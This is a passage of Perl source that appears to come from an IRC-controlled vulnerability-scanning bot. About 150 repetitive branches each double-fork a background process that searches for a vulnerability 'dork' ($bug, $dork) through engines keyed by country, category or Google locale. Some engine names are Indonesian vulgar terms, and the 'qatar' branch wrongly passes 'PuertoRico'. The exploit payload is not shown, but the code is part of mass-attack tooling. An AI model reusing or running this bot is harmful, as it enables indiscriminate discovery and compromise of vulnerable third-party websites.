        if ($engine =~ /info/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Info",$type,$nick); } exit; } }

        if ($engine =~ /iran/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Iran",$type,$nick); } exit; } }

        if ($engine =~ /italy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Italy",$type,$nick); } exit; } }

        if ($engine =~ /japan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Japan",$type,$nick); } exit; } }

        if ($engine =~ /korea/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Korea",$type,$nick); } exit; } }

        if ($engine =~ /mexico/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mexico",$type,$nick); } exit; } }

        if ($engine =~ /malaysia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Malaysia",$type,$nick); } exit; } }

        if ($engine =~ /network/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Network",$type,$nick); } exit; } }

        if ($engine =~ /netherlands/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Netherlands",$type,$nick); } exit; } }

        if ($engine =~ /organization/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Organization",$type,$nick); } exit; } }

        if ($engine =~ /philippines/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Philippines",$type,$nick); } exit; } }

        if ($engine =~ /poland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Poland",$type,$nick); } exit; } }

        if ($engine =~ /romania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Romania",$type,$nick); } exit; } }

        if ($engine =~ /russian/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Russian",$type,$nick); } exit; } }    

        if ($engine =~ /thailand/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Thailand",$type,$nick); } exit; } }

        if ($engine =~ /ukraine/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ukraine",$type,$nick); } exit; } }

        if ($engine =~ /england/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"England",$type,$nick); } exit; } }

        if ($engine =~ /usa/i)	 { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"USA",$type,$nick); } exit; } }

        if ($engine =~ /slovenia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Slovenia",$type,$nick); } exit; } }

        if ($engine =~ /belgium/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Belgium",$type,$nick); } exit; } }

        if ($engine =~ /bussines/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bussines",$type,$nick); } exit; } }

        if ($engine =~ /southafrica/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SouthAfrica",$type,$nick); } exit; } }

        if ($engine =~ /vietnam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Vietnam",$type,$nick); } exit; } }

        if ($engine =~ /tuvalu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tuvalu",$type,$nick); } exit; } }

        if ($engine =~ /cocos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cocos",$type,$nick); } exit; } }

        if ($engine =~ /turky/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Turky",$type,$nick); } exit; } }

        if ($engine =~ /asia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Asia",$type,$nick); } exit; } }

        if ($engine =~ /serbia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Serbia",$type,$nick); } exit; } }

        if ($engine =~ /singapore/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Singapore",$type,$nick); } exit; } }

        if ($engine =~ /taiwan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Taiwan",$type,$nick); } exit; } }

        if ($engine =~ /sweden/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sweden",$type,$nick); } exit; } }

        if ($engine =~ /pakistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Pakistan",$type,$nick); } exit; } }

        if ($engine =~ /norway/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Norway",$type,$nick); } exit; } }

        if ($engine =~ /montenegro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Montenegro",$type,$nick); } exit; } }

        if ($engine =~ /greece/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Greece",$type,$nick); } exit; } }

        if ($engine =~ /education/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Education",$type,$nick); } exit; } }

        if ($engine =~ /goverment/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Goverment",$type,$nick); } exit; } }

        if ($engine =~ /kazakhstan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kazakhstan",$type,$nick); } exit; } }

        if ($engine =~ /afganistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Afganistan",$type,$nick); } exit; } }

        if ($engine =~ /albania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Albania",$type,$nick); } exit; } }

        if ($engine =~ /algeria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Algeria",$type,$nick); } exit; } }

        if ($engine =~ /angola/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Angola",$type,$nick); } exit; } }

        if ($engine =~ /armenia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Armenia",$type,$nick); } exit; } }

        if ($engine =~ /azerbaijan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Azerbaijan",$type,$nick); } exit; } }

        if ($engine =~ /bahrain/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bahrain",$type,$nick); } exit; } }

        if ($engine =~ /bangladesh/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bangladesh",$type,$nick); } exit; } }

        if ($engine =~ /belarus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Belarus",$type,$nick); } exit; } }

        if ($engine =~ /bhutan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bhutan",$type,$nick); } exit; } }

        if ($engine =~ /bolivia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bolivia",$type,$nick); } exit; } }

        if ($engine =~ /bosnia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bosnia",$type,$nick); } exit; } }

        if ($engine =~ /bulgaria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bulgaria",$type,$nick); } exit; } }

        if ($engine =~ /brunei/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Brunei",$type,$nick); } exit; } }

        if ($engine =~ /cambodia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cambodia",$type,$nick); } exit; } }

        if ($engine =~ /cameroon/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cameroon",$type,$nick); } exit; } }

        if ($engine =~ /christmas/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Christmas",$type,$nick); } exit; } }

        if ($engine =~ /costarika/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CostaRika",$type,$nick); } exit; } }

        if ($engine =~ /croatia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Croatia",$type,$nick); } exit; } }

        if ($engine =~ /cuba/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cuba",$type,$nick); } exit; } }

        if ($engine =~ /cyprus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cyprus",$type,$nick); } exit; } }

        if ($engine =~ /dominican/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Dominican",$type,$nick); } exit; } }

        if ($engine =~ /equador/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Equador",$type,$nick); } exit; } }

        if ($engine =~ /egypt/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Egypt",$type,$nick); } exit; } }

        if ($engine =~ /estonia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Estonia",$type,$nick); } exit; } }

        if ($engine =~ /finland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Finland",$type,$nick); } exit; } }

        if ($engine =~ /georgia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Georgia",$type,$nick); } exit; } }

        if ($engine =~ /ghana/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ghana",$type,$nick); } exit; } }

        if ($engine =~ /grenada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Grenada",$type,$nick); } exit; } }

        if ($engine =~ /honduras/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Honduras",$type,$nick); } exit; } }

        if ($engine =~ /hongkong/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hongkong",$type,$nick); } exit; } }

        if ($engine =~ /iceland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Iceland",$type,$nick); } exit; } }    

        if ($engine =~ /ireland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ireland",$type,$nick); } exit; } }

        if ($engine =~ /kenya/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kenya",$type,$nick); } exit; } }

        if ($engine =~ /kuwait/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kuwait",$type,$nick); } exit; } }

        if ($engine =~ /laos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Laos",$type,$nick); } exit; } }

        if ($engine =~ /latvia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Latvia",$type,$nick); } exit; } }

        if ($engine =~ /liberia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Liberia",$type,$nick); } exit; } }

        if ($engine =~ /libyan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Libyan",$type,$nick); } exit; } }

        if ($engine =~ /lithuania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Lithuania",$type,$nick); } exit; } }

        if ($engine =~ /macedonia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Macedonia",$type,$nick); } exit; } }

        if ($engine =~ /malta/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Malta",$type,$nick); } exit; } }

        if ($engine =~ /mongolia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mongolia",$type,$nick); } exit; } }

        if ($engine =~ /mozambique/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mozambique",$type,$nick); } exit; } }

        if ($engine =~ /namibia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Namibia",$type,$nick); } exit; } }

        if ($engine =~ /nauru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nauru",$type,$nick); } exit; } }

        if ($engine =~ /nepal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nepal",$type,$nick); } exit; } }

        if ($engine =~ /newzealand/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"NewZealand",$type,$nick); } exit; } }

        if ($engine =~ /nigeria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nigeria",$type,$nick); } exit; } }

        if ($engine =~ /paraguay/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Paraguay",$type,$nick); } exit; } }

        if ($engine =~ /peru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Peru",$type,$nick); } exit; } }

        if ($engine =~ /portugal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Portugal",$type,$nick); } exit; } }

        if ($engine =~ /puertorico/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PuertoRico",$type,$nick); } exit; } }

        if ($engine =~ /qatar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PuertoRico",$type,$nick); } exit; } }

        if ($engine =~ /saintlucia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SaintLucia",$type,$nick); } exit; } }

        if ($engine =~ /samoa/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Samoa",$type,$nick); } exit; } }

        if ($engine =~ /saudiarabia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SaudiArabia",$type,$nick); } exit; } }

        if ($engine =~ /senegal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Senegal",$type,$nick); } exit; } }

        if ($engine =~ /slovakia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Slovakia",$type,$nick); } exit; } }

        if ($engine =~ /srilanka/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Srilanka",$type,$nick); } exit; } }

        if ($engine =~ /swaziland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Swaziland",$type,$nick); } exit; } }

        if ($engine =~ /tajikistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tajikistan",$type,$nick); } exit; } }

        if ($engine =~ /tanzania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tanzania",$type,$nick); } exit; } }

        if ($engine =~ /tokelau/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tokelau",$type,$nick); } exit; } }

        if ($engine =~ /tonga/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tonga",$type,$nick); } exit; } }

        if ($engine =~ /tunisia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tunisia",$type,$nick); } exit; } }

        if ($engine =~ /uruguay/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uruguay",$type,$nick); } exit; } }

        if ($engine =~ /uzbekistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uzbekistan",$type,$nick); } exit; } }

        if ($engine =~ /venezuela/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Venezuela",$type,$nick); } exit; } }

        if ($engine =~ /yemen/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yemen",$type,$nick); } exit; } }

        if ($engine =~ /yugoslavia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yugoslavia",$type,$nick); } exit; } }

        if ($engine =~ /zambia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zambia",$type,$nick); } exit; } }

        if ($engine =~ /uganda/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uganda",$type,$nick); } exit; } }

        if ($engine =~ /trinidad/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Trinidad",$type,$nick); } exit; } }

        if ($engine =~ /zimbabwe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zimbabwe",$type,$nick); } exit; } }

        if ($engine =~ /kontol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"KonToL",$type,$nick);    } exit; }}

		if ($engine =~ /pepek/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

                &type($chan,$bug,$dork,"PePek",$type,$nick);

                } exit; }

    }  

		if ($engine =~ /tetek/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

            &type($chan,$bug,$dork,"TeTek",$type,$nick);

        } exit; }

    }

		if ($engine =~ /itil/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

        &type($chan,$bug,$dork,"ItiL",$type,$nick);

        } exit; }

    }                          

        if ($engine =~ /vagina/i) {

    if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

        &type($chan,$bug,$dork,"Vagina",$type,$nick);

        } exit; }

    }  

        if ($engine =~ /nennen/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

                &type($chan,$bug,$dork,"NenNen",$type,$nick);

                } exit; }

    }

        if ($engine =~ /susu/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

                &type($chan,$bug,$dork,"SuSu",$type,$nick);

                } exit; }

    }          

        if ($engine =~ /buahdada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BuahDada",$type,$nick); } exit; } }

        if ($engine =~ /payudara/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PayuDara",$type,$nick); } exit; } }

        if ($engine =~ /kentot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kentot",$type,$nick); } exit; } }

        if ($engine =~ /memek/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"MeMek",$type,$nick); } exit; } }

        if ($engine =~ /emel/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"eMeL",$type,$nick); } exit; } }

        if ($engine =~ /oral/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"OraL",$type,$nick); } exit; } }

        if ($engine =~ /klitoris/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Klitoris",$type,$nick); } exit; } }

        if ($engine =~ /masturbasi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Masturbasi",$type,$nick); } exit; } }

        if ($engine =~ /onani/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Onani",$type,$nick); } exit; } }

        if ($engine =~ /sperma/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sperma",$type,$nick); } exit; } }

        if ($engine =~ /anal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AnaL",$type,$nick); } exit; } }

        if ($engine =~ /puting/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Puting",$type,$nick); } exit; } }

        if ($engine =~ /penis/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Penis",$type,$nick); } exit; } }

        if ($engine =~ /googleCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCA",$type,$nick); } exit; } }

        if ($engine =~ /googleDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDE",$type,$nick); } exit; } }

        if ($engine =~ /googleUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUK",$type,$nick); } exit; } }

        if ($engine =~ /googleFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeFR",$type,$nick); } exit; } }

        if ($engine =~ /googleES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeES",$type,$nick); } exit; } }

        if ($engine =~ /googleIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIT",$type,$nick); } exit; } }

        if ($engine =~ /googleNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNL",$type,$nick); } exit; } }

        if ($engine =~ /googleBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBE",$type,$nick); } exit; } }

        if ($engine =~ /googleCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCH",$type,$nick); } exit; } }

        if ($engine =~ /googleSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeSE",$type,$nick); } exit; } }

        if ($engine =~ /googleDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDK",$type,$nick); } exit; } }

        if ($engine =~ /googleNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNO",$type,$nick); } exit; } }

        if ($engine =~ /googleNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNZ",$type,$nick); } exit; } }

        if ($engine =~ /googleIE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIE",$type,$nick); } exit; } }

        if ($engine =~ /googleBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBR",$type,$nick); } exit; } }

        if ($engine =~ /googleAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAR",$type,$nick); } exit; } }

        if ($engine =~ /googleCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCO",$type,$nick); } exit; } }

        if ($engine =~ /googleCU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCU",$type,$nick); } exit; } }

        if ($engine =~ /googleCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCL",$type,$nick); } exit; } }

        if ($engine =~ /googleMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMX",$type,$nick); } exit; } }

        if ($engine =~ /googleAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAU",$type,$nick); } exit; } }

        if ($engine =~ /googleRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRU",$type,$nick); } exit; } }

        if ($engine =~ /googleAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAT",$type,$nick); } exit; } }

        if ($engine =~ /googlePL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePL",$type,$nick); } exit; } }

        if ($engine =~ /googleIL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIL",$type,$nick); } exit; } }

        if ($engine =~ /googleTR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTR",$type,$nick); } exit; } }

        if ($engine =~ /googleUA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUA",$type,$nick); } exit; } }

        if ($engine =~ /googleGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeGR",$type,$nick); } exit; } }

        if ($engine =~ /googleJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeJP",$type,$nick); } exit; } }

        if ($engine =~ /googleCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCN",$type,$nick); } exit; } }

        if ($engine =~ /googleMY/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMY",$type,$nick); } exit; } }

        if ($engine =~ /googleTH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTH",$type,$nick); } exit; } }

        if ($engine =~ /googleIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIN",$type,$nick); } exit; } }

        if ($engine =~ /googleKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeKR",$type,$nick); } exit; } }

